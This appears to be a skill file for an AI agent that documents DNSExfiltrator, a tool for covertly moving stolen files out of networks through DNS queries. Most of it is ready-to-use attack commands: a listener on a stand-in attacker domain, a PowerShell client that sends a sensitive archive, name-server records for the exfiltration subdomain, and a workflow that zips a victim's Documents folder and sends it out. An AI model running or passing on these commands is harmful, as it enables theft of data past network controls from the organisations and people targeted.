---
name: dnsexfiltrator
description: "Exfiltrate data over DNS queries using a custom DNS server. Use when HTTP/S channels are blocked and DNS traffic is allowed outbound, enabling covert file transfer via DNS TXT/A records."
license: MIT
compatibility: "Python 3 (server); PowerShell (client); Linux server + Windows target; github.com/Arno0x/DNSExfiltrator"
metadata:
  author: AeonDave
  version: "1.0"
---

# DNSExfiltrator

Covert file exfiltration via DNS — Python server receives, PowerShell client sends.

## Quick Start

```bash
# Attacker side — start DNS server (needs port 53 UDP)
sudo python3 dnsexfiltrator.py -d exfil.attacker.com -p password

# Victim side (PowerShell)
Invoke-DNSExfiltrator -i C:\sensitive\file.zip -d exfil.attacker.com -p password -t 500
```

## DNS Setup

Point an NS record for your subdomain to your listener IP:
```
exfil.attacker.com    NS    ns1.attacker.com
ns1.attacker.com      A     <your-server-ip>
```

## Core Options

| Option | Purpose |
|--------|---------|
| `-d DOMAIN` | Exfil domain (server) |
| `-p PASSWORD` | Encryption passphrase |
| `-b 64/32` | Encoding (base64/base32) |
| `-t MS` | Throttle between queries (ms) |
| `-r N` | Max retries |

## Common Workflows

**Exfil archive from Windows:**
```powershell
# Compress first
Compress-Archive -Path C:\Users\victim\Documents -DestinationPath docs.zip
# Exfil
Invoke-DNSExfiltrator -i docs.zip -d exfil.attacker.com -p MyPass123 -t 200
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | DNS setup guide and throttle tuning |
